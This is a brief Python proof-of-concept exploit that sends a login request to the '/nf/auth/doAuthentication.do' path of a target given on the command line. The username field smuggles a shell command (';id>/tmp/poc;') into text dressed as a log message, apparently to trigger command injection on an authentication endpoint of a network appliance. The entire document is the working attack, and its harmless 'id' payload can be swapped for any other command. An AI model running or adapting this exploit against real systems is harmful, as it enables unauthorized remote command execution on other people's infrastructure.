import sys
import requests

requests.post(
    sys.argv[1].rstrip('/') + '/nf/auth/doAuthentication.do',
    data={'username': 'pitboss PPE unexpectedly died NSPPE-00;id>/tmp/poc; X Y',
          'password': 'invalid'},
    timeout=10,
)
